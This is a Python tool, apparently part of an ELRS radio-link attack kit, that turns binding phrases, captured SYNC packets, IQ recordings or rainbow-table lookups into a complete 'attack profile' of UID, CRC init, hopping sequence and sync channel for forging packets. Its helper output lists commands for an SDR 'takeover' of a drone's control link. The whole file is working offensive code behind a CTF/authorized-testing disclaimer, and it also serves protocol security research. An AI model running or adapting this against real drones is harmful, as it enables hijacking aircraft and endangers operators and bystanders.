#!/usr/bin/env python3
"""
ELRS Attack Profile Generator — Capture-to-attack-parameters processor

Ties the Chain 1 passive-capture tools together into one command. Takes raw
input (IQ file, pre-demodulated frames, WiFi config JSON, manual UID, or
binding phrase) and outputs a complete JSON attack profile with every
parameter the packet forger and TX emulator need.

Input sources (pick one):
  --phrase TEXT       Binding phrase (derive UID via MD5)
  --uid HEX          Manual 6-byte UID in hex (e.g. aa:bb:cc:dd:ee:ff)
  --wifi-json FILE   WiFi config JSON from elrs-wifi-extract.py
  --sync-json FILE   SYNC capture JSON from elrs-sync-capture.py
  --iq-file FILE     IQ capture file (runs elrs-sync-capture.py internally)
  --rainbow-match U4:U5  UID[4]:UID[5] hex pair to look up in rainbow table

Output:
  A JSON "attack profile" containing UID, CRC init, FHSS seed, full hopping
  sequence, sync channel, sync word, and rate parameters — everything needed
  by elrs-packet-forger.py and elrs-tx-emulator.py.

Validation:
  The profile includes a self-check: a synthetic SYNC packet is built from
  the derived parameters and its CRC is verified round-trip. If this fails,
  the profile is marked invalid.

Usage:
    # From binding phrase (known phrase attack)
    elrs-attack-profile.py --phrase "iloveflying" -o profile.json

    # Dry-run with test phrase
    elrs-attack-profile.py --dry-run

    # From WiFi config extract
    elrs-attack-profile.py --wifi-json extracted_config.json -o profile.json

    # From SYNC capture output
    elrs-attack-profile.py --sync-json sync_results.json -o profile.json

    # From manual UID (e.g. from SYNC packet observation + rainbow lookup)
    elrs-attack-profile.py --uid aa:bb:cc:dd:ee:ff -o profile.json

    # From UID[4:5] via rainbow table lookup
    elrs-attack-profile.py --rainbow-match 3a:e2 \\
        --rainbow tools/elrs-rainbow-table.json -o profile.json

    # From IQ file (invokes sync capture internally)
    elrs-attack-profile.py --iq-file capture.iq --sample-rate 4e6 \\
        --center-freq 2440e6 --rainbow tools/elrs-rainbow-table.json

    # Pretty-print profile to stdout
    elrs-attack-profile.py --phrase "iloveflying" --pretty

    # Show what commands to run with the profile
    elrs-attack-profile.py --phrase "iloveflying" --show-commands

For CTF research and authorized security testing only.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import subprocess
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

# ---------------------------------------------------------------------------
# Ensure tools/ is on sys.path for elrs_core imports
# ---------------------------------------------------------------------------
_TOOLS_DIR = Path(__file__).resolve().parent
if str(_TOOLS_DIR) not in sys.path:
    sys.path.insert(0, str(_TOOLS_DIR))

from elrs_core.crc import Crc2Byte, ELRS_CRC14_POLY, ELRS_CRC16_POLY
from elrs_core.fhss import (
    DOMAINS,
    DEFAULT_2G4_DOMAIN,
    build_sequence,
    sync_channel_candidates,
)
from elrs_core.ota import (
    OTA_VERSION_ID,
    PACKET_TYPE_SYNC,
    build_sync,
    validate_crc,
    ota_uid_crc_init,
)
from elrs_core.v3_compat import (
    v3_uid_crc_init,
    v3_uid_seed,
    v3_sync_channel,
    v3_build_sequence,
    v3_build_sync,
    v3_validate_crc,
)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
PROFILE_VERSION = 1
ISM2G4_FREQ_COUNT = 80

RATE_INTERVAL_US = {
    0: 2000,    # 500 Hz
    1: 4000,    # 250 Hz
    2: 5000,    # 200 Hz
    3: 6667,    # 150 Hz
    4: 10000,   # 100 Hz
    5: 20000,   # 50 Hz
    6: 40000,   # 25 Hz
}

RATE_NAMES = {
    0: "500Hz", 1: "250Hz", 2: "200Hz", 3: "150Hz",
    4: "100Hz", 5: "50Hz", 6: "25Hz",
}


def log(msg: str) -> None:
    print(f"[profile] {msg}", file=sys.stderr)


# ---------------------------------------------------------------------------
# UID extraction from various sources
# ---------------------------------------------------------------------------

def phrase_to_uid(phrase: str) -> bytes:
    raw = f'-DMY_BINDING_PHRASE="{phrase}"'
    return hashlib.md5(raw.encode()).digest()[:6]


def parse_uid_hex(uid_str: str) -> bytes:
    """Parse UID from hex string (aa:bb:cc:dd:ee:ff or aabbccddeeff)."""
    clean = uid_str.replace(":", "").replace(" ", "").replace("0x", "")
    if len(clean) != 12:
        raise ValueError(f"UID must be 6 bytes (12 hex chars), got {len(clean)}: {uid_str}")
    return bytes.fromhex(clean)


def uid_from_wifi_json(path: str) -> tuple[bytes, dict]:
    """Extract UID from elrs-wifi-extract.py output JSON."""
    with open(path) as f:
        data = json.load(f)

    uid_info = data.get("uid", {})
    status = uid_info.get("status")

    if status == "extracted":
        uid_hex = uid_info.get("hex", "")
        if uid_hex and len(uid_hex) == 12:
            return bytes.fromhex(uid_hex), data
        uid_bytes = uid_info.get("bytes", [])
        if len(uid_bytes) == 6:
            return bytes(uid_bytes), data
        raise ValueError(f"WiFi JSON has 'extracted' status but no valid UID data")

    if status == "not_set":
        raise ValueError("WiFi JSON reports UID is all zeros (no binding phrase set)")
    if status == "not_found":
        raise ValueError("WiFi JSON reports UID was not present in /config response")

    raise ValueError(f"WiFi JSON UID status unrecognized: {status}")


def uid_from_sync_json(path: str) -> tuple[bytes, dict]:
    """Extract UID from elrs-sync-capture.py output JSON."""
    with open(path) as f:
        data = json.load(f)

    # sync capture may output a single result or an array
    results = data if isinstance(data, list) else [data]

    for result in results:
        # Check for rainbow match (full UID recovered)
        matches = result.get("rainbow_matches", [])
        if matches:
            best = matches[0]
            uid_hex = best.get("uid_hex", "")
            if uid_hex and len(uid_hex.replace(":", "")) == 12:
                return bytes.fromhex(uid_hex.replace(":", "")), result
            uid_bytes = best.get("uid", [])
            if len(uid_bytes) == 6:
                return bytes(uid_bytes), result

        # Check for direct UID field
        uid_hex = result.get("uid_hex", "")
        if uid_hex and len(uid_hex.replace(":", "")) == 12:
            return bytes.fromhex(uid_hex.replace(":", "")), result

        uid = result.get("uid", [])
        if isinstance(uid, list) and len(uid) == 6:
            return bytes(uid), result

    raise ValueError(
        "SYNC capture JSON contains no full UID. "
        "Only partial UID[4:5] was recovered — use --rainbow-match with a rainbow table "
        "to attempt full UID recovery, or capture more SYNC packets."
    )


def uid_from_rainbow_lookup(uid4: int, uid5: int, rainbow_path: str) -> bytes:
    """Look up UID[4]:UID[5] in the rainbow table to recover the full UID."""
    with open(rainbow_path) as f:
        table = json.load(f)

    # The rainbow table maps phrases to UIDs; search for matching uid4/uid5
    entries = table if isinstance(table, list) else table.get("entries", [])
    matches = []
    for entry in entries:
        uid_bytes = entry.get("uid", [])
        if len(uid_bytes) >= 6 and uid_bytes[4] == uid4 and uid_bytes[5] == uid5:
            matches.append(entry)

    if not matches:
        raise ValueError(
            f"No rainbow table match for UID[4:5] = {uid4:02x}:{uid5:02x}. "
            f"Searched {len(entries)} entries. The binding phrase may not be in the table."
        )

    if len(matches) > 1:
        log(f"WARNING: {len(matches)} rainbow table collisions for "
            f"UID[4:5]={uid4:02x}:{uid5:02x}")
        for m in matches:
            log(f"  phrase={m.get('phrase', '?')!r}  uid={m.get('uid_hex', '?')}")
        log("Using first match — verify with CRC validation against a captured packet.")

    best = matches[0]
    uid_hex = best.get("uid_hex", "")
    if uid_hex:
        return bytes.fromhex(uid_hex.replace(":", ""))
    return bytes(best["uid"])


def run_sync_capture(iq_file: str, sample_rate: float, center_freq: float,
                     rainbow_path: str | None) -> tuple[bytes, dict]:
    """Run elrs-sync-capture.py on an IQ file and extract the UID."""
    capture_script = _TOOLS_DIR / "elrs-sync-capture.py"
    if not capture_script.exists():
        raise FileNotFoundError(f"elrs-sync-capture.py not found at {capture_script}")

    cmd = [
        sys.executable, str(capture_script),
        "--iq-file", iq_file,
        "--sample-rate", str(sample_rate),
        "--center-freq", str(center_freq),
        "--one-shot",
        "--json-output",
    ]
    if rainbow_path:
        cmd.extend(["--rainbow", rainbow_path])

    log(f"Running SYNC capture: {' '.join(cmd)}")
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)

    if result.returncode != 0:
        raise RuntimeError(
            f"elrs-sync-capture.py failed (exit {result.returncode}):\n{result.stderr}"
        )

    # Parse JSON output from stdout
    try:
        data = json.loads(result.stdout)
    except json.JSONDecodeError:
        raise RuntimeError(
            f"elrs-sync-capture.py output was not valid JSON:\n{result.stdout[:500]}"
        )

    return uid_from_sync_json_data(data)


def uid_from_sync_json_data(data: dict | list) -> tuple[bytes, dict]:
    """Extract UID from parsed sync capture data (same logic as uid_from_sync_json)."""
    results = data if isinstance(data, list) else [data]
    for result in results:
        matches = result.get("rainbow_matches", [])
        if matches:
            best = matches[0]
            uid_hex = best.get("uid_hex", "")
            if uid_hex and len(uid_hex.replace(":", "")) == 12:
                return bytes.fromhex(uid_hex.replace(":", "")), result
            uid_bytes = best.get("uid", [])
            if len(uid_bytes) == 6:
                return bytes(uid_bytes), result

        uid_hex = result.get("uid_hex", "")
        if uid_hex and len(uid_hex.replace(":", "")) == 12:
            return bytes.fromhex(uid_hex.replace(":", "")), result

        uid = result.get("uid", [])
        if isinstance(uid, list) and len(uid) == 6:
            return bytes(uid), result

    raise ValueError("SYNC capture produced no full UID match")


# ---------------------------------------------------------------------------
# Seed and CRC derivation
# ---------------------------------------------------------------------------

def uid_to_fhss_seed(uid: bytes, ota_version: int) -> int:
    return ((uid[2] << 24) | (uid[3] << 16) |
            (uid[4] << 8) | (uid[5] ^ ota_version))


def uid_to_crc_init(uid: bytes, ota_version: int) -> int:
    init = (uid[4] << 8) | uid[5]
    return init ^ (ota_version if ota_version == 3 else ota_version << 8)


def sync_channel_for_version(ota_version: int,
                             freq_count: int = ISM2G4_FREQ_COUNT) -> int:
    if ota_version not in (3, 4):
        raise ValueError(f"unsupported OTA version: {ota_version}")
    return freq_count // 2 + (1 if ota_version == 3 else 0)


# ---------------------------------------------------------------------------
# Profile builder
# ---------------------------------------------------------------------------

def build_profile(uid: bytes, ota_version: int = 3,
                  domain_name: str = DEFAULT_2G4_DOMAIN,
                  rate_enum: int = 4,
                  source_info: dict | None = None) -> dict:
    """Build the complete attack profile from a 6-byte UID."""
    if len(uid) != 6:
        raise ValueError(f"UID must be 6 bytes, got {len(uid)}")

    domain = DOMAINS[domain_name]
    freq_count = domain.freq_count

    if ota_version == 3:
        sync_channel = v3_sync_channel(freq_count)
        fhss_seed = v3_uid_seed(uid)
        crc_init = v3_uid_crc_init(uid)
        fhss_seq = v3_build_sequence(uid, freq_count)
    else:
        sync_channel = sync_channel_for_version(ota_version, freq_count)
        fhss_seed = uid_to_fhss_seed(uid, ota_version)
        crc_init = uid_to_crc_init(uid, ota_version)
        fhss_seq = build_sequence(fhss_seed, freq_count, sync_channel)

    # Channel frequencies in Hz
    hop_freqs_hz = [domain.channel_freq(ch) for ch in fhss_seq]

    # Sync word (the UID[4:5] bytes visible in every SYNC packet)
    sync_word = (uid[4] << 8) | uid[5]

    # Build validation SYNC packet and verify CRC round-trip
    validation = _validate_profile(uid, ota_version, crc_init, fhss_seq,
                                   sync_channel, rate_enum,
                                   is_full=False)

    profile = {
        "profile_version": PROFILE_VERSION,
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "generator": "elrs-attack-profile.py",

        "uid": {
            "hex": uid.hex(),
            "bytes": list(uid),
            "uid4": uid[4],
            "uid5": uid[5],
            "sync_visible_hex": f"{uid[4]:02x}:{uid[5]:02x}",
        },

        "ota_version": ota_version,
        "ota_version_note": f"ELRS {'3.x (Betaflight 4.4.2)' if ota_version == 3 else '4.x'}",

        "crc": {
            "init": crc_init,
            "init_hex": f"0x{crc_init:04X}",
            "poly_14bit": ELRS_CRC14_POLY,
            "poly_14bit_hex": f"0x{ELRS_CRC14_POLY:04X}",
            "poly_16bit": ELRS_CRC16_POLY,
            "poly_16bit_hex": f"0x{ELRS_CRC16_POLY:04X}",
        },

        "fhss": {
            "seed": fhss_seed,
            "seed_hex": f"0x{fhss_seed:08X}",
            "domain": domain_name,
            "freq_count": freq_count,
            "freq_start_hz": domain.freq_start,
            "freq_stop_hz": domain.freq_stop,
            "sync_channel": sync_channel,
            "sync_channel_freq_hz": domain.channel_freq(sync_channel),
            "sync_channel_freq_mhz": round(domain.channel_freq(sync_channel) / 1e6, 1),
            "sequence_length": len(fhss_seq),
            "sequence": fhss_seq,
            "hop_frequencies_hz": hop_freqs_hz,
        },

        "sync_word": {
            "value": sync_word,
            "hex": f"0x{sync_word:04X}",
        },

        "rate": {
            "enum": rate_enum,
            "name": RATE_NAMES.get(rate_enum, f"unknown({rate_enum})"),
            "interval_us": RATE_INTERVAL_US.get(rate_enum, 0),
        },

        "packet_forger_args": {
            "note": "Pass these to elrs-packet-forger.py or reconstruct from UID",
            "uid_hex": uid.hex(),
            "ota_version": ota_version,
            "crc_init": crc_init,
            "fhss_seed": fhss_seed,
            "sync_channel": sync_channel,
        },

        "tx_emulator_args": {
            "note": "Parameters for elrs-tx-emulator.py",
            "uid_hex": uid.hex(),
            "ota_version": ota_version,
            "rate_enum": rate_enum,
            "sync_channel": sync_channel,
        },

        "validation": validation,
    }

    if source_info:
        profile["source"] = source_info

    return profile


def _validate_profile(uid: bytes, ota_version: int, crc_init: int,
                      fhss_seq: list[int], sync_channel: int,
                      rate_enum: int, is_full: bool) -> dict:
    """Build a synthetic SYNC packet and verify CRC round-trip."""
    try:
        fhss_index = fhss_seq[0] if fhss_seq else sync_channel

        if ota_version == 3:
            sync_pkt = v3_build_sync(
                uid=uid,
                fhss_index=fhss_index,
                nonce=0,
                rate_index=rate_enum,
            )
            crc_ok = v3_validate_crc(sync_pkt, uid)
        else:
            sync_pkt = build_sync(
                is_full=is_full,
                fhss_index=fhss_index,
                nonce=0,
                rf_rate_enum=rate_enum,
                uid4=uid[4],
                uid5=uid[5],
                crc_init=crc_init,
                ota_nonce=0,
            )
            crc_ok = validate_crc(
                sync_pkt, is_full, crc_init,
                ota_nonce=0, packet_type=PACKET_TYPE_SYNC,
            )

        # Verify FHSS sequence starts with sync channel
        seq_starts_sync = (len(fhss_seq) > 0 and fhss_seq[0] == sync_channel)

        return {
            "status": "valid" if (crc_ok and seq_starts_sync) else "FAILED",
            "crc_round_trip": crc_ok,
            "fhss_starts_with_sync": seq_starts_sync,
            "test_sync_packet_hex": sync_pkt.hex(),
            "test_packet_size": len(sync_pkt),
        }
    except Exception as e:
        return {
            "status": "ERROR",
            "error": str(e),
        }


# ---------------------------------------------------------------------------
# Output helpers
# ---------------------------------------------------------------------------

def print_summary(profile: dict) -> None:
    """Print human-readable summary to stderr."""
    uid = profile["uid"]
    crc = profile["crc"]
    fhss = profile["fhss"]
    val = profile["validation"]
    rate = profile["rate"]

    print(f"\n{'='*60}", file=sys.stderr)
    print("ELRS Attack Profile", file=sys.stderr)
    print(f"{'='*60}", file=sys.stderr)
    print(f"  UID:            {uid['hex']}", file=sys.stderr)
    print(f"  UID visible:    {uid['sync_visible_hex']} (in every SYNC)", file=sys.stderr)
    print(f"  OTA version:    {profile['ota_version']} ({profile['ota_version_note']})", file=sys.stderr)
    print(f"  CRC init:       {crc['init_hex']}", file=sys.stderr)
    print(f"  FHSS seed:      {fhss['seed_hex']}", file=sys.stderr)
    print(f"  Domain:         {fhss['domain']} ({fhss['freq_count']} channels)", file=sys.stderr)
    print(f"  Sync channel:   {fhss['sync_channel']} ({fhss['sync_channel_freq_mhz']} MHz)", file=sys.stderr)
    print(f"  Sequence len:   {fhss['sequence_length']}", file=sys.stderr)
    print(f"  Rate:           {rate['name']} ({rate['interval_us']} us)", file=sys.stderr)
    print(f"  Validation:     {val['status']}", file=sys.stderr)
    if val.get("test_sync_packet_hex"):
        print(f"  Test SYNC pkt:  {val['test_sync_packet_hex']}", file=sys.stderr)
    print(f"\n  First 20 hops:  {fhss['sequence'][:20]}", file=sys.stderr)
    freqs_mhz = [round(f / 1e6, 1) for f in fhss["hop_frequencies_hz"][:10]]
    print(f"  First 10 freqs: {freqs_mhz} MHz", file=sys.stderr)

    src = profile.get("source", {})
    if src:
        print(f"\n  Source:         {src.get('type', 'unknown')}", file=sys.stderr)
        if src.get("phrase"):
            print(f"  Phrase:         {src['phrase']!r}", file=sys.stderr)
        if src.get("file"):
            print(f"  File:           {src['file']}", file=sys.stderr)

    print(f"{'='*60}\n", file=sys.stderr)


def print_commands(profile: dict) -> None:
    """Print example commands that consume this profile."""
    uid_hex = profile["uid"]["hex"]
    ota_v = profile["ota_version"]

    print("\n--- Packet Forger Commands ---", file=sys.stderr)
    print(f"  # Show derived parameters", file=sys.stderr)
    print(f"  python3 elrs-packet-forger.py --phrase <PHRASE> --ota-version {ota_v} info\n", file=sys.stderr)
    print(f"  # Generate SYNC packet", file=sys.stderr)
    print(f"  python3 elrs-packet-forger.py --phrase <PHRASE> --ota-version {ota_v} sync\n", file=sys.stderr)

    print("--- TX Emulator Commands ---", file=sys.stderr)
    print(f"  # Dry-run (show parameters, no TX)", file=sys.stderr)
    print(f"  python3 elrs-tx-emulator.py --phrase <PHRASE> --ota-version {ota_v} info\n", file=sys.stderr)
    print(f"  # Takeover via SDR (REQUIRES --arm)", file=sys.stderr)
    print(f"  python3 elrs-tx-emulator.py --phrase <PHRASE> --ota-version {ota_v} "
          f"--backend sdr --arm takeover\n", file=sys.stderr)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main() -> int:
    parser = argparse.ArgumentParser(
        description="ELRS Attack Profile Generator — capture-to-attack-parameters processor",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="For CTF research and authorized security testing only.",
    )

    # Input sources (mutually exclusive)
    src = parser.add_argument_group("input source (pick one)")
    src_excl = src.add_mutually_exclusive_group()
    src_excl.add_argument("--phrase", metavar="TEXT",
                          help="ELRS binding phrase (derive UID via MD5)")
    src_excl.add_argument("--uid", metavar="HEX",
                          help="Manual 6-byte UID hex (aa:bb:cc:dd:ee:ff or aabbccddeeff)")
    src_excl.add_argument("--wifi-json", metavar="FILE",
                          help="WiFi config JSON from elrs-wifi-extract.py")
    src_excl.add_argument("--sync-json", metavar="FILE",
                          help="SYNC capture JSON from elrs-sync-capture.py")
    src_excl.add_argument("--iq-file", metavar="FILE",
                          help="IQ capture file (runs elrs-sync-capture.py)")
    src_excl.add_argument("--rainbow-match", metavar="U4:U5",
                          help="UID[4]:UID[5] hex pair for rainbow table lookup")
    src_excl.add_argument("--dry-run", action="store_true",
                          help='Generate profile using test phrase "default"')

    # IQ capture options
    iq = parser.add_argument_group("IQ capture options (with --iq-file)")
    iq.add_argument("--sample-rate", type=float, default=4e6,
                    help="IQ sample rate in Hz (default: 4e6)")
    iq.add_argument("--center-freq", type=float, default=2440e6,
                    help="IQ center frequency in Hz (default: 2440e6)")

    # Rainbow table
    parser.add_argument("--rainbow", metavar="FILE",
                        help="Rainbow table JSON (for --rainbow-match or --iq-file)")

    # Protocol options
    proto = parser.add_argument_group("protocol options")
    proto.add_argument("--ota-version", type=int, default=3, choices=[3, 4],
                       help="OTA version: 3=ELRS 3.x/BF4.4.2, 4=ELRS 4.x (default: 3)")
    proto.add_argument("--domain", default=DEFAULT_2G4_DOMAIN,
                       choices=list(DOMAINS.keys()),
                       help=f"Regulatory domain (default: {DEFAULT_2G4_DOMAIN})")
    proto.add_argument("--rate", type=int, default=4, choices=range(7),
                       help="ELRS rate enum: 0=500Hz..6=25Hz (default: 4=100Hz)")

    # Output options
    out = parser.add_argument_group("output options")
    out.add_argument("-o", "--output", metavar="FILE",
                     help="Write profile JSON to file (default: stdout)")
    out.add_argument("--pretty", action="store_true",
                     help="Pretty-print JSON output")
    out.add_argument("--show-commands", action="store_true",
                     help="Print example tool commands to stderr")
    out.add_argument("--quiet", action="store_true",
                     help="Suppress summary output on stderr")

    args = parser.parse_args()

    # Resolve input source → UID
    uid: bytes | None = None
    source_info: dict = {}

    try:
        if args.dry_run:
            phrase = "default"
            uid = phrase_to_uid(phrase)
            source_info = {"type": "dry_run", "phrase": phrase}
            log(f"Dry-run mode: using test phrase {phrase!r}")

        elif args.phrase:
            uid = phrase_to_uid(args.phrase)
            source_info = {"type": "binding_phrase", "phrase": args.phrase}
            log(f"Derived UID from phrase: {uid.hex()}")

        elif args.uid:
            uid = parse_uid_hex(args.uid)
            source_info = {"type": "manual_uid", "uid_input": args.uid}
            log(f"Using manual UID: {uid.hex()}")

        elif args.wifi_json:
            uid, wifi_data = uid_from_wifi_json(args.wifi_json)
            source_info = {
                "type": "wifi_config",
                "file": args.wifi_json,
                "device": wifi_data.get("device", {}),
            }
            log(f"Extracted UID from WiFi config: {uid.hex()}")

        elif args.sync_json:
            uid, sync_data = uid_from_sync_json(args.sync_json)
            source_info = {"type": "sync_capture", "file": args.sync_json}
            log(f"Extracted UID from SYNC capture: {uid.hex()}")

        elif args.iq_file:
            uid, capture_data = run_sync_capture(
                args.iq_file, args.sample_rate, args.center_freq,
                args.rainbow,
            )
            source_info = {
                "type": "iq_capture",
                "file": args.iq_file,
                "sample_rate": args.sample_rate,
                "center_freq": args.center_freq,
            }
            log(f"Extracted UID from IQ capture: {uid.hex()}")

        elif args.rainbow_match:
            parts = args.rainbow_match.split(":")
            if len(parts) != 2:
                parser.error("--rainbow-match must be U4:U5 hex pair (e.g. 3a:e2)")
            uid4 = int(parts[0], 16)
            uid5 = int(parts[1], 16)
            rainbow_path = args.rainbow
            if not rainbow_path:
                # Try default locations
                for candidate in [
                    _TOOLS_DIR / "elrs-rainbow-table.json",
                    _TOOLS_DIR.parent / "tools" / "elrs-rainbow-table.json",
                ]:
                    if candidate.exists():
                        rainbow_path = str(candidate)
                        break
            if not rainbow_path:
                parser.error("--rainbow-match requires --rainbow <table.json>")
            uid = uid_from_rainbow_lookup(uid4, uid5, rainbow_path)
            source_info = {
                "type": "rainbow_lookup",
                "uid4_uid5": args.rainbow_match,
                "rainbow_table": rainbow_path,
            }
            log(f"Rainbow table match: {uid.hex()}")

        else:
            parser.error(
                "No input source specified. Use --phrase, --uid, --wifi-json, "
                "--sync-json, --iq-file, --rainbow-match, or --dry-run."
            )

    except (ValueError, FileNotFoundError, RuntimeError) as e:
        print(f"ERROR: {e}", file=sys.stderr)
        return 1

    # Build the profile
    profile = build_profile(
        uid=uid,
        ota_version=args.ota_version,
        domain_name=args.domain,
        rate_enum=args.rate,
        source_info=source_info,
    )

    # Validate
    if profile["validation"]["status"] != "valid":
        log(f"WARNING: Profile validation FAILED: {profile['validation']}")

    # Output
    if not args.quiet:
        print_summary(profile)

    if args.show_commands:
        print_commands(profile)

    indent = 2 if args.pretty else None
    json_str = json.dumps(profile, indent=indent)

    if args.output:
        with open(args.output, "w") as f:
            f.write(json_str)
            f.write("\n")
        log(f"Profile written to {args.output}")
    else:
        print(json_str)

    return 0


if __name__ == "__main__":
    sys.exit(main())
